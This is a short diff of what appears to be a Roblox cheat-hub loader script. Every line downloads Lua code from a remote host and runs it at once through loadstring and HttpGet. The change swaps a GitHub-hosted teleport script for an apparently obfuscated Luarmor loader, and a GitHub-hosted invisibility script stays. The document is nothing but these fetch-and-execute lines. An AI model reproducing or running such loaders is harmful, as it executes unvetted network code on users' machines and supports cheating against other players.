@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ypurmuda/hubs/refs/heads/main/invisible.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ypurmuda/hubs/refs/heads/main/flashtp.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/b88ac918b62a5aa7c216d316418e81cf.lua"))()
